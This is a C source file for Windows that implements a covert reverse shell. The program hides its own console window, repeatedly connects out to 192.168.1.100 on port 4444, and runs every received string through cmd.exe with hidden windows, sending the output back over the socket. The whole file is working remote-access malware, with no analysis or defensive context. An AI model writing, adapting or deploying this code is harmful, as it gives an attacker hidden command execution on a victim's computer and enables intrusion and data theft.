#include <winsock.h>
#include <stdio.h>
#include <windows.h>


#pragma comment(lib,"ws2_32.lib")

int main(int argc,char **argv)
{
	char Path[MAX_PATH] = {0};
	GetConsoleTitle(Path, MAX_PATH);
	printf("%s\n",Path);
	HWND hWindows = FindWindow(NULL,Path);//隐藏进程，只能在资源管理器查找
	ShowWindow(hWindows,SW_HIDE);

	char *messages = "=========== Connect successful !===========\n";
	WSADATA WSAData;
	SOCKET sock; 
	SOCKADDR_IN addr_in;
	char buf[1024]; 
	memset(buf,0,1024); 

	WSAStartup(MAKEWORD(2,2),&WSAData); 

	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(4444); 
	addr_in.sin_addr.S_un.S_addr=inet_addr("192.168.1.100"); 

	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	while (connect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in))==SOCKET_ERROR) 
	{
	//	printf("wait for 5s to auto try again\n");
		Sleep(5000); 
		continue;
	}

	send(sock,messages,strlen(messages),0); 

	char buffer[2048] = {0};

	for(char cmdline[270];;memset(cmdline,0,sizeof(cmdline)))
	{

		GetSystemDirectory(cmdline,MAX_PATH+1); 
		strcat(cmdline,"//cmd.exe /c"); 


		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;

		CreatePipe(&hRead,&hWrite,&sa,0); 

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si); 
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE; 
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

    

		int len=recv(sock,buf,1024,NULL);
	
		if(len==SOCKET_ERROR)
			exit(0);

		strncat(cmdline,buf,strlen(buf)); 


		CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi); 

		CloseHandle(hWrite);

		for(DWORD bytesRead;ReadFile(hRead,buffer,2048,&bytesRead,NULL); memset(buffer,0,2048))
		{
			send(sock,buffer,strlen(buffer),0);
		}
	

	}

	return 0;

}


